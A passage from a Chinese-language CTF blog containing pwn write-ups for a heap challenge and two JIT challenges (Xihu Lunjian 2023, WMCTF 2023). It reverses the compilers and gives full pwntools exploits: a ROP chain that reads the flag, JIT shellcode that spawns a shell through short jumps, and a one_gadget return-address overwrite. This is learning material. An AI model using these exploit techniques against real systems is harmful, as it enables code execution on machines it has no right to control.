class="hljs-number">0x44444444</span>,<span class="hljs-number">0x55555555</span>,<span class="hljs-number">0x66666666</span>,<br>    lea_ret,<span class="hljs-number">0x88888888</span>,<br>    libc.sym[<span class="hljs-string">&#x27;gets&#x27;</span>],add_esp_4,libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>],<br>    libc.sym[<span class="hljs-string">&#x27;gets&#x27;</span>],add_esp_4,heap_base+<span class="hljs-number">0x5524</span>,<br>])<br><br>orw = flat([<br>    libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>],add_esp_8,heap_base+<span class="hljs-number">0x4c2f</span>,<span class="hljs-number">0</span>,<br>    libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>],add_esp_1c,<span class="hljs-number">3</span>,heap_base+<span class="hljs-number">0x5000</span>,<span class="hljs-number">0x30</span>,<br>    ret,ret,ret,ret,<br>    libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>],add_esp_1c,<span class="hljs-number">1</span>,heap_base+<span class="hljs-number">0x5000</span>,<span class="hljs-number">0x30</span>,<br><br>])<br>edit(<span class="hljs-number">2</span>,p32(heap_base+<span class="hljs-number">0x1111</span>)+p32(<span class="hljs-number">0x11111</span>))<br>edit(<span class="hljs-number">2</span>,p32(heap_base+<span class="hljs-number">0x1111</span>)+p32(<span class="hljs-number">0x111</span>))<br>edit(<span class="hljs-number">2</span>,p32(heap_base+<span class="hljs-number">0x1111</span>)+p32(<span class="hljs-number">0x1</span>))<br><br>edit(<span class="hljs-number">1</span>,cyclic(<span class="hljs-number">0x4</span>) + p32(heap_base+<span class="hljs-number">0x54a8</span>)*<span class="hljs-number">3</span> + p32(heap_base + <span class="hljs-number">0x54e8</span>)*<span class="hljs-number">4</span> + p32(heap_base + <span class="hljs-number">0x54e8</span>) +p32(<span class="hljs-number">0x2044</span>+elf_base))<br><br>edit(<span class="hljs-number">3</span>,payload)<br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;......................................../flag&#x27;</span>)<br>leak(<span class="hljs-string">&quot;heap&quot;</span>,heap_base)<br>gdb.attach(p,<span class="hljs-string">&quot;b *$rebase(0x204c)\nc\n&quot;</span>)<br>edit(<span class="hljs-number">0</span>,p32(<span class="hljs-number">0xfffffff6</span>)+p32(heap_base+<span class="hljs-number">0x4bd9</span>))<br>show(<span class="hljs-number">0</span>)<br><br>sl(orw)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>额exp写的很乱，凑合着看吧</p><h2 id="西葫芦🗡-2023-JIT-😭"><a href="#西葫芦🗡-2023-JIT-😭" class="headerlink" title="西葫芦🗡 2023 JIT 😭"></a>西葫芦🗡 2023 JIT 😭</h2><p>今年年初的西葫芦🗡是👴第一次打大比赛，当初👴还不懂事，出了两道简单题后还不知好歹，看了一眼jit，当时就被吓得亚麻呆住了。</p><p>刨坟挖出来康康题，结果逆了一天逆了个大概，第二天一直在想怎么能把<code>shellcode</code>写到<code>exec_memory</code>里，最后还是看了rode👴的wp，用了<code>jmp short</code> 的短指令完成系统调用。</p><h3 id="逆亿下🤮🤮"><a href="#逆亿下🤮🤮" class="headerlink" title="逆亿下🤮🤮"></a>逆亿下🤮🤮</h3><p>整体逻辑还行</p><p>mmap了一个具有rwx权限的<code>memory</code>，经过<code>Compiler::handleFn</code>处理后，输入的内容会变成<code>memory</code>出的汇编，最后执行。</p><p>一个个来看</p><p>这个算是个对<code>exec_memory</code>的初始化</p><p><img src="/img/C++/14.png" alt="img"></p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-title">Compiler::</span>handleFn`函数里面，会读取输入的第一个字节，要求为\xff，并读取第<span class="hljs-number">1</span>、<span class="hljs-number">2</span>个字节为`args`和`locals<br></code></pre></td></tr></table></figure><p><img src="/img/C++/15.png" alt="img"></p><p>进入<code>Compiler::creatFunc</code>，<code>args</code> 要 小于8，<code>locals</code>要小于0x20，然后在<code>exec_memory</code>里用<code>sub rsp, 8*locals</code>开一个栈空间</p><p><img src="/img/C++/16.png" alt="img"></p><p>然后进入核心函数<code>Compiler::handleFnBody()</code></p><p>里面的<code>Compiler::var2idx</code>是将传入的参数进行处理，动调一下发现是[rbp - ret_value*8]</p><p>存在整数溢出漏洞，可以看到上层函数接受返回值的参数是单字节的，所以当varib为0xa0时可以使返回值为0，可以直接对rbp进行操作</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">char</span> __cdecl <span class="hljs-title">Compiler::var2idx</span><span class="hljs-params">(u8 varib)</span></span><br><span class="hljs-function"></span>&#123;<br>  u8 variba; <span class="hljs-comment">// [rsp+Ch] [rbp-1Ch]</span><br><br>  <span class="hljs-keyword">if</span> ( (varib &amp; <span class="hljs-number">0x7F</span>) == <span class="hljs-number">0</span> )              <span class="hljs-comment">//varib!=0x7f </span><br>    <span class="hljs-built_in">fatal</span>();<br>  <span class="hljs-keyword">if</span> ( (varib &amp; <span class="hljs-number">0x80</span>u) == <span class="hljs-number">0</span> )             <span class="hljs-comment">//varib &lt; 0x80</span><br>  &#123;<br>    <span class="hljs-keyword">if</span> ( varib &gt; Compiler::ctx_args )<br>      <span class="hljs-built_in">fatal</span>();<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">char</span>)(<span class="hljs-number">8</span> * varib) &lt;= <span class="hljs-number">0</span> )<br>      <span class="hljs-built_in">fatal</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">8</span> * varib;<br>  &#125;<br>  <span class="hljs-keyword">else</span>                  <span class="hljs-number">1000</span>     <span class="hljs-number">1010</span>             <span class="hljs-comment">//varib &gt; 0x80</span><br>  &#123;<br>    variba = varib ^ <span class="hljs-number">0x80</span>;<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)(varib ^ <span class="hljs-number">0x80</span>) &gt; Compiler::ctx_locals )    <span class="hljs-comment">//当locals设置为max 0x20,varib max = 0xa0</span><br>      <span class="hljs-built_in">fatal</span>();<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">char</span>)(<span class="hljs-number">-8</span> * variba) &gt; <span class="hljs-number">0</span> )<br>      <span class="hljs-built_in">fatal</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-8</span> * variba;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/C++/17.png" alt="img"></p><p>后面就是0-5的<code>opcode</code>，6的利用条件太tm烦了👴就没看</p><p>基本上就是</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">case</span> <span class="hljs-number">0u</span>:<br>        v0 = IRstream::<span class="hljs-built_in">getop</span>();                 <span class="hljs-comment">// 感觉是ret</span><br>        <span class="hljs-keyword">return</span> Compiler::<span class="hljs-built_in">var2idx</span>(v0);<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1u</span>:<br>        v2 = IRstream::<span class="hljs-built_in">getop</span>();                 <span class="hljs-comment">// mov [rbp - var],num</span><br>        var = Compiler::<span class="hljs-built_in">var2idx</span>(v2);<br>        imm = IRstream::<span class="hljs-built_in">getimm</span>();<br>        AsmHelper::<span class="hljs-built_in">imm2var</span>(var, imm);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2u</span>:<br>        v3 = IRstream::<span class="hljs-built_in">getop</span>();<br>        var1 = Compiler::<span class="hljs-built_in">var2idx</span>(v3);<br>        v4 = IRstream::<span class="hljs-built_in">getop</span>();<br>        var2 = Compiler::<span class="hljs-built_in">var2idx</span>(v4);<br>        AsmHelper::<span class="hljs-built_in">var2reg</span>(var2);               <span class="hljs-comment">// mov [rbp-var2],[rbp-var1]</span><br>        AsmHelper::<span class="hljs-built_in">pvar2reg</span>(var1);<br>        AsmHelper::<span class="hljs-built_in">regassign</span>();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3u</span>:<br>        v5 = IRstream::<span class="hljs-built_in">getop</span>();<br>        var1_0 = Compiler::<span class="hljs-built_in">var2idx</span>(v5);<br>        v6 = IRstream::<span class="hljs-built_in">getop</span>();<br>        var2_0 = Compiler::<span class="hljs-built_in">var2idx</span>(v6);<br>        AsmHelper::<span class="hljs-built_in">var2reg</span>(var2_0);<br>        AsmHelper::<span class="hljs-built_in">pvar2reg</span>(var1_0);<br>        AsmHelper::<span class="hljs-built_in">regarith</span>(<span class="hljs-number">0x21</span>u);             <span class="hljs-comment">// and [rbp-var2_0],[rbp-var1_0]</span><br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4u</span>:<br>        v7 = IRstream::<span class="hljs-built_in">getop</span>();<br>        var1_1 = Compiler::<span class="hljs-built_in">var2idx</span>(v7);<br>        v8 = IRstream::<span class="hljs-built_in">getop</span>();<br>        var2_1 = Compiler::<span class="hljs-built_in">var2idx</span>(v8);<br>        AsmHelper::<span class="hljs-built_in">var2reg</span>(var2_1);<br>        AsmHelper::<span class="hljs-built_in">pvar2reg</span>(var1_1);<br>        AsmHelper::<span class="hljs-built_in">regarith</span>(<span class="hljs-number">9u</span>);                <span class="hljs-comment">// or [rbp-var2-1],[rbp-var1_1]</span><br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5u</span>:<br>        v9 = IRstream::<span class="hljs-built_in">getop</span>();<br>        var1_2 = Compiler::<span class="hljs-built_in">var2idx</span>(v9);<br>        v10 = IRstream::<span class="hljs-built_in">getop</span>();<br>        var2_2 = Compiler::<span class="hljs-built_in">var2idx</span>(v10);<br>        AsmHelper::<span class="hljs-built_in">var2reg</span>(var2_2);             <span class="hljs-comment">// xor [rbp-var2_2],[rbp-var2_1]</span><br>        AsmHelper::<span class="hljs-built_in">pvar2reg</span>(var1_2);<br>        AsmHelper::<span class="hljs-built_in">regarith</span>(<span class="hljs-number">0x31</span>u);<br>        <span class="hljs-keyword">break</span>;<br>       <br></code></pre></td></tr></table></figure><p>最后<code>AsmHelper::func_ret</code>恢复栈帧，这样<code>just in time</code> 基本上就好了</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-title">JITHelper::</span>finailize()`将`exec_memory`的`rwx`权限改为`r_x<br></code></pre></td></tr></table></figure><p>后面的一连串check是使第一次转汇编的输入的<code>id</code>和<code>args</code>必须为0</p><p><img src="/img/C++/18.png" alt="img"></p><p>然后就是执行了<code>exec_memory</code>了</p><h3 id="利用🏳️🏳️"><a href="#利用🏳️🏳️" class="headerlink" title="利用🏳️🏳️"></a>利用🏳️🏳️</h3><p>那么问题来了，执行的时候没有<code>write</code>权限，👴该怎么往上写<code>shellcode</code>呢</p><p>👴一开始想的是在栈上布置<code>rop</code>链，但是要先泄露<code>libc</code>，也<code>pass</code>了</p><p>这是怎么绘事捏</p><p>后来看了rode👴的wp，又学到了新的东西</p><p>因为case 1中mov到栈上的是8字节，于是可以是<code>“xor rax, rax; jmp short&quot;</code>这种短跳转代码，那👴懂啦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;172.10.0.8&#x27;</span>, <span class="hljs-number">9999</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./jit&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br><br>gdb.attach(p,<span class="hljs-string">&quot;b *$rebase(0x1ddf)\nc\n&quot;</span>)<br><br>payload = <span class="hljs-string">b&#x27;\xff\x00\x00\x20&#x27;</span><br>payload += <span class="hljs-string">b&#x27;\x01\x8b&#x27;</span> + <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>                            <span class="hljs-comment">#mov [rbp-0xb*8], /bin/sh</span><br>payload += <span class="hljs-string">b&#x27;\x01\x8a&#x27;</span> + p64(<span class="hljs-number">0xffffffffff00</span>)                       <span class="hljs-comment">#mov [rbp-0xa*8], 0xffffffffff00</span><br>payload += <span class="hljs-string">b&#x27;\x01\x89&#x27;</span> + p64(<span class="hljs-number">0x47</span>)                                 <span class="hljs-comment">#mov [rbp-9*8], 0x47</span><br>payload += <span class="hljs-string">b&#x27;\x01\x88&#x27;</span> + <span class="hljs-string">b&quot;\x48\x31\xf6\xeb\x0c\x00\x00\x00&quot;</span>       <span class="hljs-comment">#xor rsi, rsi; jmp 0x11</span><br>payload += <span class="hljs-string">b&#x27;\x01\x87&#x27;</span> + <span class="hljs-string">b&quot;\x48\x31\xd2\xeb\x0c\x00\x00\x00&quot;</span>       <span class="hljs-comment">#xor rdx, rdx; jmp 0x11</span><br>payload += <span class="hljs-string">b&#x27;\x01\x86&#x27;</span> + <span class="hljs-string">b&quot;\x48\x31\xc0\xeb\x0c\x00\x00\x00&quot;</span>       <span class="hljs-comment">#xor rax, rax; jmp 0x11</span><br>payload += <span class="hljs-string">b&#x27;\x01\x85&#x27;</span> + <span class="hljs-string">b&quot;\x04\x3b\xeb\x0d\x00\x00\x00\x00&quot;</span>       <span class="hljs-comment">#add al, 0x3b; jmp 0x11</span><br>payload += <span class="hljs-string">b&#x27;\x01\x84&#x27;</span> + <span class="hljs-string">b&quot;\x0f\x05\x00\x00\x00\x00\x00\x00&quot;</span>       <span class="hljs-comment">#syscall</span><br>payload += <span class="hljs-string">b&#x27;\x03\xa0\x8a&#x27;</span>                                         <span class="hljs-comment">#and [rbp], [rbp-0xa*8]</span><br>payload += <span class="hljs-string">b&#x27;\x04\xa0\x89&#x27;</span>                                         <span class="hljs-comment">#or [rbp], [rbp-9*8]</span><br>payload += <span class="hljs-string">b&#x27;\x00\x8b&#x27;</span>                                             <span class="hljs-comment">#mov rdi,[rbp-b*8];ret</span><br><br>sd(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="WMCTF-2023-JIT🥵"><a href="#WMCTF-2023-JIT🥵" class="headerlink" title="WMCTF 2023 JIT🥵"></a>WMCTF 2023 JIT🥵</h2><p>just in time ，又是你！！</p><p>👴只是想把C++pwn题学明白，👴有什么错，要拿2000行的屎山代码来恶心👴</p><h3 id="再逆亿下"><a href="#再逆亿下" class="headerlink" title="再逆亿下"></a>再逆亿下</h3><p>先输入<code>program</code>和<code>memory</code>，<code>program</code>要是16进制字符串，<code>memory</code>要是<code>len(program) //2</code></p><p><img src="/img/C++/19.png" alt="img"></p><p>这边大致是创建虚拟机并进行一系列初始化的过程，具体操作👴也没逆明白</p><p><img src="/img/C++/20.png" alt="img"></p><p>然后就是核心<code>code</code></p><p><img src="/img/C++/21.png" alt="img"></p><p><code>func_8510</code>里，通过<code>func_84e0--&gt;func_8370--&gt;func_5a50</code>这个2000行的屎山把输入的<code>program</code>翻译成汇编存储在申请出来的<code>chunk</code>里</p><p><code>mmap</code>一片内存，把<code>chunk</code>里的汇编<code>copy</code>过去，然后<code>mprotect</code>改成<code>r_x</code>权限</p><p><code>call rax</code>就是执行翻译的汇编</p><p><img src="/img/C++/22.png" alt="img"></p><p>最后有个<code>result</code>输出的是执行完后的寄存器<code>rax</code>值</p><p>差不多了，快吐了</p><p>😭😭😭</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>问题来了，那个2000行的代码等👴看完估计是天都亮了，👴果断去看wp，发现很多👴都说这是<code>ebpf</code></p><p>👴：？？？</p><p>👴：妈妈生的，这是个什么玩意</p><p>然后👴就去找这玩意的<a href="https://github.com/iovisor/bpf-docs/blob/master/eBPF.md">指令集</a></p><p>一试，对上了，那就好办了</p><p>先连上找个libc值给rax，打印出来康康libc版本</p><p>然后就是ogg覆盖返回地址，因为👴莫得找到syscall</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;172.10.0.8&#x27;</span>, <span class="hljs-number">9999</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;jit&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br><span class="hljs-comment"># rax:0</span><br><span class="hljs-comment"># rdi:1</span><br><span class="hljs-comment"># rsi:2</span><br><span class="hljs-comment"># rdx:3</span><br><span class="hljs-comment"># r9:4</span><br><span class="hljs-comment"># r8:5</span><br><span class="hljs-comment"># rbx:6</span><br><span class="hljs-comment"># r13:7</span><br><span class="hljs-comment"># r14:8</span><br><span class="hljs-comment"># r15:9</span><br><span class="hljs-comment"># rbp:a</span><br><br>program = <span class="hljs-string">b&#x27;61a0380100000000&#x27;</span>   <span class="hljs-comment">#mov eax,[rbp-0x138]</span><br>program += <span class="hljs-string">b&#x27;1400000083400200&#x27;</span>  <span class="hljs-comment">#sub eax,libc.sym[&#x27;__libc_start_main&#x27;]+243</span><br>program += <span class="hljs-string">b&#x27;04000000043b0e00&#x27;</span>  <span class="hljs-comment">#add eax,ogg</span><br>program += <span class="hljs-string">b&#x27;7b8a280000000000&#x27;</span>  <span class="hljs-comment">#mov [rbp+0x28],r14</span><br>program += <span class="hljs-string">b&#x27;630a280000000000&#x27;</span>  <span class="hljs-comment">#mov [rbp+0x28],eax</span><br>program += <span class="hljs-string">b&#x27;af22000000000000&#x27;</span>  <span class="hljs-comment">#xor rsi, rsi</span><br>program += <span class="hljs-string">b&#x27;af33000000000000&#x27;</span>  <span class="hljs-comment">#xor rdx, rdx</span><br>memory = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(program)//<span class="hljs-number">2</span>).encode()<br><br>gdb.attach(p,<span class="hljs-string">&quot;b *$rebase(0x2947)\nc\n&quot;</span>)<br>sla(<span class="hljs-string">b&#x27;: &#x27;</span>,program)<br>leak(<span class="hljs-string">&quot;libc_start_main&quot;</span>,libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]+<span class="hljs-number">243</span>)<br>sla(<span class="hljs-string">b&#x27;: &#x27;</span>,memory)<br><br><br><span class="hljs-comment"># 0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span><br><span class="hljs-comment"># constraints:</span><br><span class="hljs-comment">#   [r15] == NULL || r15 == NULL</span><br><span class="hljs-comment">#   [r12] == NULL || r12 == NULL</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># 0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span><br><span class="hljs-comment"># constraints:</span><br><span class="hljs-comment">#   [r15] == NULL || r15 == NULL</span><br><span class="hljs-comment">#   [rdx] == NULL || rdx == NULL</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># 0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span><br><span class="hljs-comment"># constraints:</span><br><span class="hljs-comment">#   [rsi] == NULL || rsi == NULL</span><br><span class="hljs-comment">#   [rdx] == NULL || rdx == NULL</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>不知道是不是👴的错觉，<code>JIT</code>总给👴一种用<code>shellcode</code>完成利用方式的<code>vm</code>题</p><p>真的逆吐惹🤮🤮🤮</p><p>而且👴有一个问题，怎么那么多👴看到题一眼就知道是<code>ebpf</code>？？？</p><p>后续：</p><p><img src="/img/C++/23.png" alt="img"></p><p>👴&lt;——🤡🤡🤡🤡🤡</p><h1 id="0xff-写在最后的最后"><a href="#0xff-写在最后的最后" class="headerlink" title="0xff:写在最后的最后"></a>0xff:写在最后的最后</h1><p>逆不动了，真tm逆不动了，汗流浃背了已经🥵🥵🥵</p><h1 id="Refer"><a href="#Refer" class="headerlink" title="Refer"></a>Refer</h1><p><a href="https://zqy.ink/2023/05/12/dingjiqiandao/">N1CTF Junior 2023 pwn 顶级签到 赛题复现 | 张清越 (zqy.ink)</a></p><p><a href="https://www.bookstack.cn/read/CTF-All-In-One/doc-6.1.8_pwn_dctf2017_flex.md">6.1 Pwn - 6.1.8 pwn DCTF2017 Flex - 《CTF 竞赛入门指南(CTF All In One)》 - 书栈网 · BookStack</a></p><p><a href="https://www.anquanke.com/post/id/89855#h3-8">Shanghai-DCTF-2017 线下攻防Pwn题-安全客 - 安全资讯平台 (anquanke.com)</a></p><p><a href="https://arttnba3.cn/2021/01/20/CTF-0X02-STARCTF2021-PWN/#0x02-babygame-double-free-tcache-poisoning">【CTF.0X02】*CTF2021-Pwn WP - arttnba3’s blog</a></p><p><a href="https://www.cnblogs.com/winmt/articles/17018284.html">NepnepxCATCTF Pwn-Chao WriteUp - winmt - 博客园 (cnblogs.com)</a></p><p><a href="https://www.roderickchan.cn/zh-cn/2023-02-02-2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%88%9D%E8%B5%9Bpwn-jit/">2023西湖论剑初赛pwn-jit - roderick - record and learn! (roderickchan.cn)</a></p><p><a href="https://lst-oss.github.io/2023/08/23/jit-pwn/#2023-wmctf-jit">jit-pwn - Hexo (lst-oss.github.io)</a></p>]]></content>
    
    
    <categories>
      
      <category>Record-of-Learn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C++</tag>
      
      <tag>CTF</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
